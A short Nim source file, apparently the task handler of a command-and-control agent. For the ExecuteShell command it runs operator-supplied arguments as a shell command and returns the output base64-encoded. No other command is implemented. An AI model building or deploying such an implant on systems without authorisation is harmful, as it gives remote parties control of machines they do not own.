import base64 
import ./types 
import ./commands/commands

proc handleTask*(task: Task): Task = 
    
    # Handle task command
    case task.command: 
    of ExecuteShell: 
        
        let (output, status) = taskShell(task.args)
        echo output

        return Task(
            id: task.id, 
            agent: task.agent,
            command: task.command,
            args: task.args,
            result: encode(output), # Base64 encode result
            status: status
        )

    else: 
        echo "Not implemented"
        return nil 

    return task